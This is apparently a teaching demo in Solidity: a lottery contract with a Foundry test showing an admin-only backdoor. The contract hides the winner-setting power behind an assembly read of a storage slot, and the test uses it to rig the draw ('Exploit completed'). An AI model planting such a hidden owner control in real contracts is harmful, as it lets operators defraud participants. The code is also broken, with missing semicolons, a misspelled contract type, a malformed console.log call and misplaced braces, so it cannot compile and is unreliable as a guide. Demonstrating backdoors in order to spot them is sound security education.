//SPDX-Licendse-Identifier: MIT
pragma solidity ^0.8.24

import "forge-std/Test.sol"

contract LotteryGame {
    uint256 public prize = 1000;
    address public winner;
    address public admain = msg.sender;
modifier safeCheck(){
    if(msg.sender == referee()){
        _;
    }
    else{
        getWinner();
    }
}
function referee() internal view returns(address user) {
    assembly {
        user:= sload(2)
    }
}

function pickWinner(address random) public safeCheck {
assembly {
    sstore(1, random);
}
}

function getWinner() public view returns(address){
    console.log("current winner :", winner);
    return winner;

}

contract ContractTest is Test {
    LotterGame LotterGameContract ;
    function testBackDoor() public {
         address alice = vm.addr(1);
         address bob = vm.addr(2);
         LotterGameContract = new LotteryGame();
         console.log("Alice perfoms pickWinner , of course she will not be a winner");
         vm.prank(alice);
         LotterGameContract.pickWinner(address(alice));
         console.log("Prize :" LotterGameContract.prize());

         console.log("Now admain sets the winner to drain out the prize");
         LotterGameContract.pickWinner(address(bob));
         console.log("Admain masnipulats winner: ", LotterGameContract.winner());
         console.log("Exploit completed");


    }
}
}
